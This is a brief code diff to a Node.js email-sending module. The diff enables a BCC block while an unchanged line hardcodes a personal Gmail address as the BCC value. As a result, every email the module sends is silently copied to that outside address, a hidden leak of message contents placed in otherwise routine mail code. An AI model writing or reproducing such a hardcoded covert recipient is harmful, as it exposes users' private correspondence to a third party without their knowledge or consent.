@@ -180,9 +180,9 @@ module.exports = function() {
             html: obj.body
           };
           obj.bcc= "claudiu9379@gmail.com";
-          // if(obj.bcc){
-          //   emailMessage.bcc = obj.bcc;
-          // }
+          if(obj.bcc){
+            emailMessage.bcc = obj.bcc;
+          }
 
           // console.log(obj);
             this.transporter.sendMail(emailMessage, function(err, data, res) {
